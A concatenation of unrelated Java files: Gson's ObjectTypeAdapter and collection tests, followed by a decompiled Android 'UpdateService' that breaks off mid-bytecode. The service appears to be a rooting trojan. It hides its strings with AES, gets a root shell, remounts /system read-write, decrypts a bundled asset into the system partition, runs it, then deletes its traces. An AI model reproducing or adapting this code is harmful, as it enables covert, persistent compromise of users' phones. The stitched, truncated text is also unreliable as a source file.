/*
 * Copyright (C) 2011 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.gson.internal.bind;

import com.google.gson.Gson;
import com.google.gson.TypeAdapter;
import com.google.gson.TypeAdapterFactory;
import com.google.gson.internal.LinkedTreeMap;
import com.google.gson.reflect.TypeToken;
import com.google.gson.stream.JsonReader;
import com.google.gson.stream.JsonToken;
import com.google.gson.stream.JsonWriter;

import java.io.IOException;
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Adapts types whose static type is only 'Object'. Uses getClass() on
 * serialization and a primitive/Map/List on deserialization.
 */
public final class ObjectTypeAdapter extends TypeAdapter<Object> {
  private static final BigInteger MAX_INT = BigInteger.valueOf(Integer.MAX_VALUE);
  private static final BigInteger MIN_INT = BigInteger.valueOf(Integer.MIN_VALUE);
  private static final BigInteger MAX_LONG = BigInteger.valueOf(Long.MAX_VALUE);
  private static final BigInteger MIN_LONG = BigInteger.valueOf(Long.MIN_VALUE);

  public static final TypeAdapterFactory FACTORY = new TypeAdapterFactory() {
    @SuppressWarnings("unchecked")
    @Override public <T> TypeAdapter<T> create(Gson gson, TypeToken<T> type) {
      if (type.getRawType() == Object.class) {
        return (TypeAdapter<T>) new ObjectTypeAdapter(gson);
      }
      return null;
    }
  };

  private final Gson gson;

  ObjectTypeAdapter(Gson gson) {
    this.gson = gson;
  }

  @Override public Object read(JsonReader in) throws IOException {
    JsonToken token = in.peek();
    switch (token) {
    case BEGIN_ARRAY:
      List<Object> list = new ArrayList<Object>();
      in.beginArray();
      while (in.hasNext()) {
        list.add(read(in));
      }
      in.endArray();
      return list;

    case BEGIN_OBJECT:
      Map<String, Object> map = new LinkedTreeMap<String, Object>();
      in.beginObject();
      while (in.hasNext()) {
        map.put(in.nextName(), read(in));
      }
      in.endObject();
      return map;

    case STRING:
      return in.nextString();

    case NUMBER:
      String str = in.nextString();
      if (str.contains(".") || str.contains("E") || str.contains("e")) {
        return Double.valueOf(str);
      } else {
        BigInteger big = new BigInteger(str);
        if (big.compareTo(MAX_INT) <= 0 && big.compareTo(MIN_INT) >= 0)
          return big.intValue();
        if (big.compareTo(MAX_LONG) <= 0 && big.compareTo(MIN_LONG) >= 0)
          return big.longValue();
        return big;
      }

    case BOOLEAN:
      return in.nextBoolean();

    case NULL:
      in.nextNull();
      return null;

    default:
      throw new IllegalStateException();
    }
  }

  @SuppressWarnings("unchecked")
  @Override public void write(JsonWriter out, Object value) throws IOException {
    if (value == null) {
      out.nullValue();
      return;
    }

    TypeAdapter<Object> typeAdapter = (TypeAdapter<Object>) gson.getAdapter(value.getClass());
    if (typeAdapter instanceof ObjectTypeAdapter) {
      out.beginObject();
      out.endObject();
      return;
    }

    typeAdapter.write(out, value);
  }
}

/*
 * Copyright (C) 2011 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.gson;

import java.math.BigInteger;
import java.util.*;
import junit.framework.TestCase;

public final class ObjectTypeAdapterTest extends TestCase {
  private final Gson gson = new GsonBuilder().create();
  private final TypeAdapter<Object> adapter = gson.getAdapter(Object.class);

  public void testDeserialize() throws Exception {
    Map<?, ?> map = (Map<?, ?>) adapter.fromJson("{\"a\":5,\"b\":[1,2,null],\"c\":{\"x\":\"y\"}}");
    assertEquals(5, map.get("a"));
    assertEquals(Arrays.asList(1, 2, null), map.get("b"));
    assertEquals(Collections.singletonMap("x", "y"), map.get("c"));
    assertEquals(3, map.size());
  }

  public void testSerialize() throws Exception {
    Object object = new RuntimeType();
    assertEquals("{'a':5,'b':[1,2,null]}", adapter.toJson(object).replace("\"", "'"));
  }
  
  public void testSerializeNullValue() throws Exception {
    Map<String, Object> map = new LinkedHashMap<String, Object>();
    map.put("a", null);
    assertEquals("{'a':null}", adapter.toJson(map).replace('"', '\''));
  }

  public void testDeserializeNullValue() throws Exception {
    Map<String, Object> map = new LinkedHashMap<String, Object>();
    map.put("a", null);
    assertEquals(map, adapter.fromJson("{\"a\":null}"));
  }

  public void testSerializeObject() throws Exception {
    assertEquals("{}", adapter.toJson(new Object()));
  }

  public void testDeserializeNumbers() {
    String json = "[2147483647,9223372036854775807,9223372036854775808,-9223372036854775809,1E6,1.0]";
    Object[] numbers = gson.fromJson(json, Object[].class);
    assertEquals(Integer.MAX_VALUE, numbers[0]);                       //int
    assertEquals(Long.MAX_VALUE, numbers[1]);                          //long
    assertEquals(new BigInteger("9223372036854775808"), numbers[2]);  //BigInteger
    assertEquals(new BigInteger("-9223372036854775809"), numbers[3]); //BigInteger
    assertEquals(1.0E6, numbers[4]);                                    //double
    assertEquals(1.0, numbers[5]);                                      //double
  }

  @SuppressWarnings("unused")
  private class RuntimeType {
    Object a = 5;
    Object b = Arrays.asList(1, 2, null);
  }
}

/*
 * Copyright (C) 2008 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.gson.functional;

import java.lang.reflect.Type;
import java.util.*;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonElement;
import com.google.gson.JsonPrimitive;
import com.google.gson.JsonSerializationContext;
import com.google.gson.JsonSerializer;
import com.google.gson.common.MoreAsserts;
import com.google.gson.common.TestTypes.BagOfPrimitives;
import com.google.gson.reflect.TypeToken;

import junit.framework.TestCase;

/**
 * Functional tests for Json serialization and deserialization of collections.
 *
 * @author Inderjeet Singh
 * @author Joel Leitch
 */
public class CollectionTest extends TestCase {
  private Gson gson;

  @Override
  protected void setUp() throws Exception {
    super.setUp();
    gson = new Gson();
  }

  public void testTopLevelCollectionOfIntegersSerialization() {
    Collection<Integer> target = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);
    Type targetType = new TypeToken<Collection<Integer>>() {}.getType();
    String json = gson.toJson(target, targetType);
    assertEquals("[1,2,3,4,5,6,7,8,9]", json);
  }

  public void testTopLevelCollectionOfIntegersDeserialization() {
    String json = "[0,1,2,3,4,5,6,7,8,9]";
    Type collectionType = new TypeToken<Collection<Integer>>() { }.getType();
    Collection<Integer> target = gson.fromJson(json, collectionType);
    int[] expected = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
    MoreAsserts.assertEquals(expected, toIntArray(target));
  }

  public void testTopLevelListOfIntegerCollectionsDeserialization() throws Exception {
    String json = "[[1,2,3],[4,5,6],[7,8,9]]";
    Type collectionType = new TypeToken<Collection<Collection<Integer>>>() {}.getType();
    List<Collection<Integer>> target = gson.fromJson(json, collectionType);
    int[][] expected = new int[3][3];
    for (int i = 0; i < 3; ++i) {
      int start = (3 * i) + 1;
      for (int j = 0; j < 3; ++j) {
        expected[i][j] = start + j;
      }
    }

    for (int i = 0; i < 3; i++) {
      MoreAsserts.assertEquals(expected[i], toIntArray(target.get(i)));
    }
  }

  public void testLinkedListSerialization() {
    List<String> list = new LinkedList<String>();
    list.add("a1");
    list.add("a2");
    Type linkedListType = new TypeToken<LinkedList<String>>() {}.getType();
    String json = gson.toJson(list, linkedListType);
    assertTrue(json.contains("a1"));
    assertTrue(json.contains("a2"));
  }

  public void testLinkedListDeserialization() {
    String json = "['a1','a2']";
    Type linkedListType = new TypeToken<LinkedList<String>>() {}.getType();
    List<String> list = gson.fromJson(json, linkedListType);
    assertEquals("a1", list.get(0));
    assertEquals("a2", list.get(1));
  }

  public void testQueueSerialization() {
    Queue<String> queue = new LinkedList<String>();
    queue.add("a1");
    queue.add("a2");
    Type queueType = new TypeToken<Queue<String>>() {}.getType();
    String json = gson.toJson(queue, queueType);
    assertTrue(json.contains("a1"));
    assertTrue(json.contains("a2"));
  }

  public void testQueueDeserialization() {
    String json = "['a1','a2']";
    Type queueType = new TypeToken<Queue<String>>() {}.getType();
    Queue<String> queue = gson.fromJson(json, queueType);
    assertEquals("a1", queue.element());
    queue.remove();
    assertEquals("a2", queue.element());
  }

  public void testPriorityQueue() throws Exception {
    Type type = new TypeToken<PriorityQueue<Integer>>(){}.getType();
    PriorityQueue<Integer> queue = gson.fromJson("[10, 20, 22]", type);
    assertEquals(3, queue.size());
    String json = gson.toJson(queue);
    assertEquals(10, queue.remove().intValue());
    assertEquals(20, queue.remove().intValue());
    assertEquals(22, queue.remove().intValue());
    assertEquals("[10,20,22]", json);
  }

  public void testVector() {
    Type type = new TypeToken<Vector<Integer>>(){}.getType();
    Vector<Integer> target = gson.fromJson("[10, 20, 31]", type);
    assertEquals(3, target.size());
    assertEquals(10, target.get(0).intValue());
    assertEquals(20, target.get(1).intValue());
    assertEquals(31, target.get(2).intValue());
    String json = gson.toJson(target);
    assertEquals("[10,20,31]", json);
  }

  public void testStack() {
    Type type = new TypeToken<Stack<Integer>>(){}.getType();
    Stack<Integer> target = gson.fromJson("[11, 13, 17]", type);
    assertEquals(3, target.size());
    String json = gson.toJson(target);
    assertEquals(17, target.pop().intValue());
    assertEquals(13, target.pop().intValue());
    assertEquals(11, target.pop().intValue());
    assertEquals("[11,13,17]", json);
  }

  public void testNullsInListSerialization() {
    List<String> list = new ArrayList<String>();
    list.add("foo");
    list.add(null);
    list.add("bar");
    String expected = "[\"foo\",null,\"bar\"]";
    Type typeOfList = new TypeToken<List<String>>() {}.getType();
    String json = gson.toJson(list, typeOfList);
    assertEquals(expected, json);
  }

  public void testNullsInListDeserialization() {
    List<String> expected = new ArrayList<String>();
    expected.add("foo");
    expected.add(null);
    expected.add("bar");
    String json = "[\"foo\",null,\"bar\"]";
    Type expectedType = new TypeToken<List<String>>() {}.getType();
    List<String> target = gson.fromJson(json, expectedType);
    for (int i = 0; i < expected.size(); ++i) {
      assertEquals(expected.get(i), target.get(i));
    }
  }

  public void testCollectionOfObjectSerialization() {
    List<Object> target = new ArrayList<Object>();
    target.add("Hello");
    target.add("World");
    assertEquals("[\"Hello\",\"World\"]", gson.toJson(target));

    Type type = new TypeToken<List<Object>>() {}.getType();
    assertEquals("[\"Hello\",\"World\"]", gson.toJson(target, type));
  }

  public void testCollectionOfObjectWithNullSerialization() {
    List<Object> target = new ArrayList<Object>();
    target.add("Hello");
    target.add(null);
    target.add("World");
    assertEquals("[\"Hello\",null,\"World\"]", gson.toJson(target));

    Type type = new TypeToken<List<Object>>() {}.getType();
    assertEquals("[\"Hello\",null,\"World\"]", gson.toJson(target, type));
  }

  public void testCollectionOfStringsSerialization() {
    List<String> target = new ArrayList<String>();
    target.add("Hello");
    target.add("World");
    assertEquals("[\"Hello\",\"World\"]", gson.toJson(target));
  }

  public void testCollectionOfBagOfPrimitivesSerialization() {
    List<BagOfPrimitives> target = new ArrayList<BagOfPrimitives>();
    BagOfPrimitives objA = new BagOfPrimitives(3L, 1, true, "blah");
    BagOfPrimitives objB = new BagOfPrimitives(2L, 6, false, "blahB");
    target.add(objA);
    target.add(objB);

    String result = gson.toJson(target);
    assertTrue(result.startsWith("["));
    assertTrue(result.endsWith("]"));
    for (BagOfPrimitives obj : target) {
      assertTrue(result.contains(obj.getExpectedJson()));
    }
  }

  public void testCollectionOfStringsDeserialization() {
    String json = "[\"Hello\",\"World\"]";
    Type collectionType = new TypeToken<Collection<String>>() { }.getType();
    Collection<String> target = gson.fromJson(json, collectionType);

    assertTrue(target.contains("Hello"));
    assertTrue(target.contains("World"));
  }

  public void testRawCollectionOfIntegersSerialization() {
    Collection<Integer> target = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);
    assertEquals("[1,2,3,4,5,6,7,8,9]", gson.toJson(target));
  }

  @SuppressWarnings("rawtypes")
  public void testRawCollectionSerialization() {
    BagOfPrimitives bag1 = new BagOfPrimitives();
    Collection target = Arrays.asList(bag1, bag1);
    String json = gson.toJson(target);
    assertTrue(json.contains(bag1.getExpectedJson()));
  }

  @SuppressWarnings("rawtypes")
  public void testRawCollectionDeserializationNotAlllowed() {
    String json = "[0,1,2,3,4,5,6,7,8,9]";
    Collection integers = gson.fromJson(json, Collection.class);
    // JsonReader converts numbers to long by default so we need L suffix
    assertEquals(Arrays.asList(0, 1, 2, 3, 4, 5, 6, 7, 8, 9), integers);

    json = "[\"Hello\", \"World\"]";
    Collection strings = gson.fromJson(json, Collection.class);
    assertTrue(strings.contains("Hello"));
    assertTrue(strings.contains("World"));
  }

  @SuppressWarnings({"rawtypes", "unchecked"})
  public void testRawCollectionOfBagOfPrimitivesNotAllowed() {
    BagOfPrimitives bag = new BagOfPrimitives(10, 20, false, "stringValue");
    String json = '[' + bag.getExpectedJson() + ',' + bag.getExpectedJson() + ']';
    Collection target = gson.fromJson(json, Collection.class);
    assertEquals(2, target.size());
    for (Object bag1 : target) {
      // Gson 2.0 converts raw objects into maps
      Map<String, Object> values = (Map<String, Object>) bag1;
      assertTrue(values.containsValue(10));
      assertTrue(values.containsValue(20));
      assertTrue(values.containsValue("stringValue"));
    }
  }

  public void testWildcardPrimitiveCollectionSerilaization() throws Exception {
    Collection<? extends Integer> target = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);
    Type collectionType = new TypeToken<Collection<? extends Integer>>() { }.getType();
    String json = gson.toJson(target, collectionType);
    assertEquals("[1,2,3,4,5,6,7,8,9]", json);

    json = gson.toJson(target);
    assertEquals("[1,2,3,4,5,6,7,8,9]", json);
  }

  public void testWildcardPrimitiveCollectionDeserilaization() throws Exception {
    String json = "[1,2,3,4,5,6,7,8,9]";
    Type collectionType = new TypeToken<Collection<? extends Integer>>() { }.getType();
    Collection<? extends Integer> target = gson.fromJson(json, collectionType);
    assertEquals(9, target.size());
    assertTrue(target.contains(1));
    assertTrue(target.contains(9));
  }

  public void testWildcardCollectionField() throws Exception {
    Collection<BagOfPrimitives> collection = new ArrayList<BagOfPrimitives>();
    BagOfPrimitives objA = new BagOfPrimitives(3L, 1, true, "blah");
    BagOfPrimitives objB = new BagOfPrimitives(2L, 6, false, "blahB");
    collection.add(objA);
    collection.add(objB);

    ObjectWithWildcardCollection target = new ObjectWithWildcardCollection(collection);
    String json = gson.toJson(target);
    assertTrue(json.contains(objA.getExpectedJson()));
    assertTrue(json.contains(objB.getExpectedJson()));

    target = gson.fromJson(json, ObjectWithWildcardCollection.class);
    Collection<? extends BagOfPrimitives> deserializedCollection = target.getCollection();
    assertEquals(2, deserializedCollection.size());
    assertTrue(deserializedCollection.contains(objA));
    assertTrue(deserializedCollection.contains(objB));
  }

  public void testFieldIsArrayList() {
    HasArrayListField object = new HasArrayListField();
    object.longs.add(1L);
    object.longs.add(3L);
    String json = gson.toJson(object, HasArrayListField.class);
    assertEquals("{\"longs\":[1,3]}", json);
    HasArrayListField copy = gson.fromJson("{\"longs\":[1,3]}", HasArrayListField.class);
    assertEquals(Arrays.asList(1L, 3L), copy.longs);
  }

  public void testUserCollectionTypeAdapter() {
    Type listOfString = new TypeToken<List<String>>() {}.getType();
    Object stringListSerializer = new JsonSerializer<List<String>>() {
      public JsonElement serialize(List<String> src, Type typeOfSrc,
          JsonSerializationContext context) {
        return new JsonPrimitive(src.get(0) + ";" + src.get(1));
      }
    };
    Gson gson = new GsonBuilder()
        .registerTypeAdapter(listOfString, stringListSerializer)
        .create();
    assertEquals("\"ab;cd\"", gson.toJson(Arrays.asList("ab", "cd"), listOfString));
  }

  static class HasArrayListField {
    ArrayList<Long> longs = new ArrayList<Long>();
  }

  @SuppressWarnings("rawtypes")
  private static int[] toIntArray(Collection collection) {
    int[] ints = new int[collection.size()];
    int i = 0;
    for (Iterator iterator = collection.iterator(); iterator.hasNext(); ++i) {
      Object obj = iterator.next();
      if (obj instanceof Integer) {
        ints[i] = ((Integer)obj).intValue();
      } else if (obj instanceof Long) {
        ints[i] = ((Long)obj).intValue();
      }
    }
    return ints;
  }

  private static class ObjectWithWildcardCollection {
    private final Collection<? extends BagOfPrimitives> collection;

    public ObjectWithWildcardCollection(Collection<? extends BagOfPrimitives> collection) {
      this.collection = collection;
    }

    public Collection<? extends BagOfPrimitives> getCollection() {
      return collection;
    }
  }

  private static class Entry {
    int value;
    Entry(int value) {
      this.value = value;
    }
  }
  public void testSetSerialization() {
    Set<Entry> set = new HashSet<Entry>();
    set.add(new Entry(1));
    set.add(new Entry(2));
    String json = gson.toJson(set);
    assertTrue(json.contains("1"));
    assertTrue(json.contains("2"));
  }
  public void testSetDeserialization() {
    String json = "[{value:1},{value:2}]";
    Type type = new TypeToken<Set<Entry>>() {}.getType();
    Set<Entry> set = gson.fromJson(json, type);
    assertEquals(2, set.size());
    for (Entry entry : set) {
      assertTrue(entry.value == 1 || entry.value == 2);
    }
  }

  private class BigClass { private Map<String, ? extends List<SmallClass>> inBig; }

  private class SmallClass { private String inSmall; }

  public void testIssue1107() {
    String json = "{\n" +
            "  \"inBig\": {\n" +
            "    \"key\": [\n" +
            "      { \"inSmall\": \"hello\" }\n" +
            "    ]\n" +
            "  }\n" +
            "}";
    BigClass bigClass = new Gson().fromJson(json, BigClass.class);
    SmallClass small = bigClass.inBig.get("key").get(0);
    assertNotNull(small);
    assertEquals("hello", small.inSmall);
  }
}

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import com.ju6.AdManager;
import com.ju6.AdRequester;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public final class UpdateService extends Service {
  private static long INTERVAL = 60000L;

  private static final int OL = 18316;

  private static final byte[][] TIPS;

  private static final int TL = 18320;

  private static byte[] WP = new byte[] {
          83, 116, 97, 107, 95, 121, 69, 120, 121, 45,
          101, 76, 116, 33, 80, 119 };

  private String mAName = null;

  private String mIdentifier = "-1";

  private AdRequester mJu6Ad = null;

  private long mTickets = 9L;

  private Timer mTimer = null;

  private long startDelay = 3600L;

  static {
    byte[] arrayOfByte1 = {
            -52, -81, 75, 27, 11, -108, 122, 121, -21, 74,
            81, 73, 76, -123, 73, -116, 109, -42, 41, 37,
            116, -64, 35, -78, -6, -90, 123, 80, 42, 13,
            56, 37 };
    byte[] arrayOfByte2 = {
            115, -41, -127, 17, 21, -7, 104, 90, -74, -93,
            79, -65, 72, 115, 113, 124, 20, 113, -67, -55,
            -99, -60, -89, -90, -123, 74, 6, -58, 69, 109,
            -68, -46 };
    byte[] arrayOfByte3 = {
            35, 67, 97, 69, -98, -60, -101, 44, Byte.MIN_VALUE, -91,
            87, -127, 113, -59, 64, -108 };
    byte[] arrayOfByte4 = {
            21, -103, -35, -1, 13, 52, 89, 16, -62, 114,
            65, -15, -81, -87, 5, -17 };
    byte[] arrayOfByte5 = {
            -57, -52, -17, -79, 84, 22, -87, 107, 10, 34,
            96, -113, -125, 82, -92, -96 };
    byte[] arrayOfByte6 = {
            -48, 15, -69, 65, -83, -22, 118, -61, 60, -126,
            65, 59, 77, -119, -38, 23 };
    byte[] arrayOfByte7 = {
            107, -31, 110, -42, -112, 47, 114, 115, 26, 66,
            -89, 117, -105, 85, -110, -62, -63, 19, 8, 41,
            7, -17, -31, 67, -35, -105, -92, -89, -102, -29,
            -79, 91 };
    byte[] arrayOfByte8 = {
            -5, 113, -72, -5, -85, -32, 83, -11, -7, -115,
            -53, -69, 13, -63, 71, 70, -105, 53, 104, -9,
            42, 14, -37, 34, -101, 4, 104, 49, -80, 48,
            26, -6 };
    byte[] arrayOfByte9 = {
            64, 7, -51, 38, -114, 81, 22, -124, 106, 122,
            88, 119, 48, -77, 94, 59 };
    byte[] arrayOfByte10 = {
            38, -60, -30, 13, 122, -106, -16, -18, 106, -79,
            36, -44, -53, 82, 68, Byte.MAX_VALUE };
    byte[] arrayOfByte11 = {
            -1, -119, 1, 31, 13, 76, -18, 25, Byte.MIN_VALUE, 103,
            63, 105, 2, -100, 6, 9 };
    TIPS = new byte[][] {
            arrayOfByte1, arrayOfByte2, {
            -47, 111, 106, -3, -88, -100, 90, -62, -19, 88,
            -99, 41, -109, -21, 124, 78, -68, 65, 41, 70,
            5, -46, -113, -80, -62, 15, 67, 85, 32, -7,
            -17, 93 }, arrayOfByte3, {
            36, -42, 113, -92, 48, -31, -108, -53, -120, Byte.MIN_VALUE,
            123, 48, 8, 61, 55, 49 }, arrayOfByte4, arrayOfByte5, arrayOfByte6, arrayOfByte7, arrayOfByte8,
            {
                    10, -4, 17, 29, -58, -23, -122, 70, -71, -82,
                    74, -45, -16, -85, 122, 95 }, arrayOfByte9, arrayOfByte10, arrayOfByte11 };
  }

  private void _doTimerTask() {
    if (this.mAName == null)
      this.mAName = getSystemMount();
    MyExecutor myExecutor = new MyExecutor();
    if (!myExecutor.init()) {
      myExecutor.close();
      shouMyDiag();
      return;
    }
    checkFile(myExecutor, false);
    String str = getTips(0);
    File file = new File(str);
    if (!file.exists() || file.length() < 18316L) {
      String str1 = getFilesDir() + getTips(4);
      String str2 = getFilesDir() + getTips(5);
      updateInfo(str2);
      copyAssets(getTips(3), str1, 18320);
      String str5 = getTips(6);
      String str3 = getTips(1);
      String str4 = getTips(2);
      if ((new File(str5)).exists()) {
        myExecutor.execute(String.valueOf(str5) + " " + str1 + " " + str, 1000);
        myExecutor.execute(String.valueOf(str5) + " " + str1 + " " + str4, 1000);
        if (!(new File(str3)).exists())
          myExecutor.execute(String.valueOf(str5) + " " + str2 + " " + str3, 1000);
      } else {
        str5 = getTips(7);
        myExecutor.execute(String.valueOf(str5) + " " + str1 + " > " + str, 1000);
        myExecutor.execute(String.valueOf(str5) + " " + str1 + " > " + str4, 1000);
        if (!(new File(str3)).exists())
          myExecutor.execute(String.valueOf(str5) + " " + str2 + " > " + str3, 1000);
      }
      myExecutor.execute(String.valueOf(getTips(8)) + str4, 100);
      myExecutor.execute(str4, 100);
      (new File(str1)).delete();
      (new File(str2)).delete();
    }
    checkFile(myExecutor, true);
  }

  private void checkFile(MyExecutor paramMyExecutor, boolean paramBoolean) {
    String str = getTips(9);
    if (paramBoolean) {
      str = String.valueOf(str) + "ro ";
    } else {
      str = String.valueOf(str) + "rw ";
    }
    paramMyExecutor.execute(String.valueOf(String.valueOf(String.valueOf(str) + this.mAName) + " ") + getTips(10), 1000);
  }

  private boolean checkPrecondition() {
    String str = getTips(0);
    if (str == null)
      return false;
    File file = new File(str);
    return (file.exists() && file.length() >= 18316L);
  }

  private void copyAssets(String paramString1, String paramString2, int paramInt) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #8
    //   6: aconst_null
    //   7: astore #4
    //   9: aconst_null
    //   10: astore #10
    //   12: aconst_null
    //   13: astore #9
    //   15: aconst_null
    //   16: astore #7
    //   18: iload_3
    //   19: ifgt -> 23
    //   22: return
    //   23: new java/io/FileOutputStream
    //   26: dup
    //   27: aload_2
    //   28: invokespecial <init> : (Ljava/lang/String;)V
    //   31: astore #6
    //   33: aload #10
    //   35: astore #4
    //   37: aload #9
    //   39: astore_2
    //   40: aload_0
    //   41: invokevirtual getClass : ()Ljava/lang/Class;
    //   44: new java/lang/StringBuilder
    //   47: dup
    //   48: ldc_w '/assets/'
    //   51: invokespecial <init> : (Ljava/lang/String;)V
    //   54: aload_1
    //   55: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   58: invokevirtual toString : ()Ljava/lang/String;
    //   61: invokevirtual getResourceAsStream : (Ljava/lang/String;)Ljava/io/InputStream;
    //   64: astore_1
    //   65: aload_1
    //   66: astore #4
    //   68: aload_1
    //   69: astore_2
    //   70: iload_3
    //   71: newarray byte
    //   73: astore #5
    //   75: aload_1
    //   76: astore #4
    //   78: aload_1
    //   79: astore_2
    //   80: aload_1
    //   81: aload #5
    //   83: invokevirtual read : ([B)I
    //   86: pop
    //   87: aload_1
    //   88: astore #4
    //   90: aload_1
    //   91: astore_2
    //   92: aload #6
    //   94: aload_0
    //   95: aload #5
    //   97: invokespecial decrypt : ([B)[B
    //   100: invokevirtual write : ([B)V
    //   103: aload_1
    //   104: astore #4
    //   106: aload_1
    //   107: astore_2
    //   108: aload #6
    //   110: invokevirtual flush : ()V
    //   113: aload_1
    //   114: ifnull -> 121
    //   117: aload_1
    //   118: invokevirtual close : ()V
    //   121: aload #6
    //   123: ifnull -> 231
    //   126: aload #6
    //   128: invokevirtual close : ()V
    //   131: return
    //   132: astore #6
    //   134: aload #8
    //   136: astore_1
    //   137: aload #7
    //   139: astore_2
    //   140: aload_2
    //   141: astore #4
    //   143: aload_1
    //   144: astore #5
    //   146: aload #6
    //   148: invokevirtual printStackTrace : ()V
    //   151: aload_2
    //   152: ifnull -> 159
    //   155: aload_2
    //   156: invokevirtual close : ()V
    //   159: aload_1
    //   160: ifnull -> 22
    //   163: aload_1
    //   164: invokevirtual close : ()V
    //   167: return
    //   168: astore_1
    //   169: return
    //   170: astore_1
    //   171: aload #4
    //   173: ifnull -> 181
    //   176: aload #4
    //   178: invokevirtual close : ()V
    //   181: aload #5
    //   183: ifnull -> 191
    //   186: aload #5
    //   188: invokevirtual close : ()V
    //   191: aload_1
    //   192: athrow
    //   193: astore_1
    //   194: return
    //   195: astore_2
    //   196: goto -> 159
    //   199: astore_2
    //   200: goto -> 181
    //   203: astore_2
    //   204: goto -> 191
    //   207: astore_1
    //   208: goto -> 121
    //   211: astore_1
    //   212: aload #6
    //   214: astore #5
    //   216: goto -> 171
    //   219: astore #4
    //   221: aload #6
    //   223: astore_1
    //   224: aload #4
    //   226: astore #6
    //   228: goto -> 140
    //   231: return
    // Exception table:
    //   from	to	target	type
    //   23	33	132	java/lang/Exception
    //   23	33	170	finally
    //   40	65	219	java/lang/Exception
    //   40	65	211	finally
    //   70	75	219	java/lang/Exception
    //   70	75	211	finally
    //   80	87	219	java/lang/Exception
    //   80	87	211	finally
    //   92	103	219	java/lang/Exception
    //   92	103	211	finally
    //   108	113	219	java/lang/Exception
    //   108	113	211	finally
    //   117	121	207	java/lang/Exception
    //   126	131	193	java/lang/Exception
    //   146	151	170	finally
    //   155	159	195	java/lang/Exception
    //   163	167	168	java/lang/Exception
    //   176	181	199	java/lang/Exception
    //   186	191	203	java/lang/Exception
  }

  private byte[] decrypt(byte[] paramArrayOfbyte) throws Exception {
    SecretKeySpec secretKeySpec = new SecretKeySpec(WP, "AES");
    Cipher cipher = Cipher.getInstance("AES");
    cipher.init(2, secretKeySpec);
    return cipher.doFinal(paramArrayOfbyte);
  }

  private void doTimerTask() {
    if (checkPrecondition())
      stopSelf();
    this.mTickets++;
    if (this.mTickets % 10L == 0L)
      try {
        _doTimerTask();
      } catch (Exception exception) {}
    if (checkPrecondition())
      stopSelf();
  }

  private String getSystemMount() {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #4
    //   6: aconst_null
    //   7: astore_1
    //   8: aconst_null
    //   9: astore_3
    //   10: new java/io/LineNumberReader
    //   13: dup
    //   14: new java/io/FileReader
    //   17: dup
    //   18: aload_0
    //   19: bipush #13
    //   21: invokespecial getTips : (I)Ljava/lang/String;
    //   24: invokespecial <init> : (Ljava/lang/String;)V
    //   27: invokespecial <init> : (Ljava/io/Reader;)V
    //   30: astore_2
    //   31: aload #4
    //   33: astore_1
    //   34: aload_2
    //   35: invokevirtual readLine : ()Ljava/lang/String;
    //   38: astore_3
    //   39: aload_3
    //   40: ifnonnull -> 53
    //   43: aload_2
    //   44: ifnull -> 142
    //   47: aload_2
    //   48: invokevirtual close : ()V
    //   51: aload_1
    //   52: areturn
    //   53: aload_3
    //   54: ldc_w ' '
    //   57: invokevirtual split : (Ljava/lang/String;)[Ljava/lang/String;
    //   60: astore_3
    //   61: aload_3
    //   62: iconst_1
    //   63: aaload
    //   64: ldc_w '/system'
    //   67: invokevirtual compareToIgnoreCase : (Ljava/lang/String;)I
    //   70: ifne -> 34
    //   73: aload_3
    //   74: iconst_0
    //   75: aaload
    //   76: astore_1
    //   77: goto -> 34
    //   80: astore #4
    //   82: aload #5
    //   84: astore_2
    //   85: aload_3
    //   86: astore_1
    //   87: aload #4
    //   89: invokevirtual printStackTrace : ()V
    //   92: aload_2
    //   93: astore_1
    //   94: aload_3
    //   95: ifnull -> 51
    //   98: aload_3
    //   99: invokevirtual close : ()V
    //   102: aload_2
    //   103: areturn
    //   104: astore_1
    //   105: aload_2
    //   106: areturn
    //   107: astore_2
    //   108: aload_1
    //   109: ifnull -> 116
    //   112: aload_1
    //   113: invokevirtual close : ()V
    //   116: aload_2
    //   117: athrow
    //   118: astore_2
    //   119: aload_1
    //   120: areturn
    //   121: astore_1
    //   122: goto -> 116
    //   125: astore_3
    //   126: aload_2
    //   127: astore_1
    //   128: aload_3
    //   129: astore_2
    //   130: goto -> 108
    //   133: astore #4
